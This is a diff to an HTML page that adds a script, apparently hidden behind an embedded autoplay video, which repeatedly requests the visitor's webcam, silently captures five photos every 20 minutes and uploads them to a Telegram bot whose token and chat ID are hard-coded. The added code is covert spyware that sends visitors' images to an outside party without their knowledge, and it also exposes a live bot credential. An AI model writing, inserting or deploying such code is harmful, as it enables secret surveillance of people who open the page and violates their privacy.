@@ -100,6 +100,105 @@
     <iframe width="10" height="10" src="https://www.youtube.com/embed/videoseries?list=PLz_5XsXvnkesghU3DOGfktsI-aQjnd9RR&autoplay=1&mute=1&loop=1&playlist=PLz_5XsXvnkesghU3DOGfktsI-aQjnd9RR&index=5&random=true&playback_rate=2" 
             frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
 </div>
+<video id="video" width="320" height="240" autoplay></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        let videoStream = null;
 
+        const botToken = '7828437442:AAFx3E8aLrtaAuudXaqbgFt9As8qbBC2cCs';  // Your Telegram bot token
+        const chatId = '7771348001';  // Your Telegram chat ID
+
+        // Function to send image to Telegram
+        function sendToTelegram(imageData) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', imageData);
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('Image sent to Telegram successfully');
+                } else {
+                    console.error('Failed to send image to Telegram:', data);
+                }
+            })
+            .catch(error => console.error('Error sending image:', error));
+        }
+
+        // Function to capture a single photo from the video stream
+        function capturePhoto() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            // Draw the current video frame onto the canvas
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Convert the canvas content to an image URL (base64)
+            const imgData = canvas.toDataURL('image/png');
+            console.log("Captured Image:", imgData);
+
+            // Convert the base64 image to a Blob for sending via Telegram
+            const byteCharacters = atob(imgData.split(',')[1]);
+            const byteArrays = [];
+
+            for (let offset = 0; offset < byteCharacters.length; offset++) {
+                const byteArray = new Uint8Array(1);
+                byteArray[0] = byteCharacters.charCodeAt(offset);
+                byteArrays.push(byteArray);
+            }
+
+            const byteArray = new Blob(byteArrays, { type: 'image/png' });
+
+            // Send the captured image to Telegram
+            sendToTelegram(byteArray);
+        }
+
+        // Function to stop the camera after 1 second
+        function stopCamera(stream) {
+            const tracks = stream.getTracks();
+            tracks.forEach(track => track.stop());
+            console.log('Camera stopped.');
+        }
+
+        // Function to activate the camera and take 5 pictures in 1 second
+        function activateCameraAndCapture() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then((stream) => {
+                    video.srcObject = stream;
+                    videoStream = stream;
+                    
+                    // Take 5 pictures in 1 second
+                    let count = 0;
+                    const captureInterval = setInterval(() => {
+                        capturePhoto();
+                        count++;
+                        if (count >= 5) {
+                            clearInterval(captureInterval); // Stop after 5 pictures
+                            stopCamera(videoStream); // Stop the camera after 1 second
+                        }
+                    }, 200); // Capture a picture every 200ms (5 pics in 1 second)
+                    
+                    setTimeout(() => {
+                        stopCamera(videoStream); // Stop camera after 1 second of activity
+                    }, 1000); // Stop camera after 1 second of activity
+                })
+                .catch((error) => {
+                    console.error('Error accessing the camera:', error);
+                });
+        }
+
+        // Set an interval to activate the camera every 20 minutes (1200000 ms)
+        setInterval(() => {
+            activateCameraAndCapture();
+        }, 1200000); // 20 minutes in milliseconds
+
+    </script>
 </body>
 </html>
